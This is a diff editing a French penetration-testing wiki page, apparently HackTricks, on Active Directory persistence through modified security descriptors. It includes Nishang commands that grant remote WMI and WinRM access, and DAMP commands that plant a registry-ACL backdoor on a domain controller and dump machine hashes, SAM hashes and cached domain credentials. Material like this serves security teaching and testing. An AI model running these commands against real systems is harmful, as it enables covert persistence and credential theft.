@@ -4,29 +4,29 @@
 
 ## Descripteurs de sécurité
 
-[From the docs](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language): Security Descriptor Definition Language (SDDL) définit le format utilisé pour décrire un descripteur de sécurité. SDDL utilise des chaînes ACE pour les DACL et les SACL : `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`<sup>[[1]](#references)</sup>
+Les descripteurs de sécurité Windows contiennent un SID de propriétaire, un SID de groupe principal, une ACL discrétionnaire (DACL) qui contrôle l'accès, ainsi qu'une ACL système (SACL) principalement utilisée pour l'audit. Security Descriptor Definition Language (SDDL) est la représentation textuelle ; une chaîne ACE se présente sous la forme `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`.<sup>[[1]](#references)[[4]](#references)</sup>
 
-Les **descripteurs de sécurité** sont utilisés pour **stocker** les **permissions** qu’un **objet** possède **sur** un **objet**. Si vous pouvez simplement **effectuer** une **petite modification** dans le **descripteur de sécurité** d’un objet, vous pouvez obtenir des privilèges très intéressants sur cet objet sans avoir besoin d’être membre d’un groupe privilégié.
+Un descripteur de sécurité stocke l'identité du propriétaire d'un objet sécurisable ainsi que les principaux autorisés ou interdits d'exercer certains droits sur celui-ci. Si un attaquant peut modifier une DACL, il peut accorder à un principal faiblement privilégié des droits qui nécessitent normalement un rôle administratif.
 
-Ainsi, cette technique de persistence repose sur la capacité à obtenir chaque privilège nécessaire sur certains objets, afin de pouvoir effectuer une tâche qui nécessite généralement des privilèges admin, mais sans avoir besoin d’être admin.
+Cela rend les descripteurs modifiés de manière ciblée utiles pour la persistence : le compte reste en dehors des groupes privilégiés évidents tout en conservant l'accès à une surface de gestion particulière. Conservez le descripteur d'origine avant les tests afin de pouvoir supprimer exactement la modification.
 
 ### Accès à WMI
 
-Vous pouvez donner à un utilisateur l’accès pour **exécuter WMI à distance** [**using this**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)<sup>[[2]](#references)</sup> :
+Vous pouvez donner à un utilisateur l'autorisation d'**exécuter WMI à distance** [**en utilisant ceci**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)<sup>[[2]](#references)</sup> :
 ```bash
-Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
-Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
+Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc -Namespace 'root\cimv2' -Verbose
+Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc -Namespace 'root\cimv2' -Remove -Verbose # Remove
 ```
 ### Accès à WinRM
 
-Donner accès à la **console PS winrm à un utilisateur** [**à l'aide de ceci**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**<sup>[[2]](#references)</sup>
+Accordez à un utilisateur l'accès à un endpoint PowerShell/WinRM distant avec la fonction `Set-RemotePSRemoting` de Nishang :<sup>[[2]](#references)</sup>
 ```bash
 Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
 Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
 ```
 ### Accès distant aux hashes
 
-Accédez au **registry** et **dump les hashes** en créant une **Reg backdoor using** [**DAMP**](https://github.com/HarmJ0y/DAMP)**,** afin de pouvoir à tout moment récupérer le **hash de l’ordinateur**, le **SAM** et toute **credential AD** mise en cache sur l’ordinateur. Il est donc très utile d’accorder cette permission à un **regular user contre un ordinateur Domain Controller** :<sup>[[3]](#references)</sup>
+DAMP peut créer une backdoor registry-ACL qui permet ensuite de récupérer à distance le hash du compte machine, les hashes SAM locaux et les identifiants de domaine mis en cache. Accorder ces droits restreints à un compte autrement ordinaire — en particulier sur un contrôleur de domaine — fournit une persistance puissante sans appartenance à un groupe privilégié.<sup>[[3]](#references)</sup>
 ```bash
 # allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
 Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose
@@ -40,12 +40,12 @@ Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose
 # Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
 Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
 ```
-Consultez les [**Silver Tickets**](silver-ticket.md) pour découvrir comment utiliser le hash du compte ordinateur d’un contrôleur de domaine.
+Consultez [**Silver Tickets**](silver-ticket.md) pour apprendre comment utiliser le hash du compte machine d'un Domain Controller.
 
-## Références
+## References
 
 - [1] [Security Descriptor Definition Language - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language)
 - [2] [nishang - Set-RemoteWMI.ps1](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)
 - [3] [DAMP - Discretionary ACL Modification Project](https://github.com/HarmJ0y/DAMP)
-
+- [4] [Microsoft Learn — Format des chaînes des descripteurs de sécurité](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-string-format)
 {{#include ../../banners/hacktricks-training.md}}
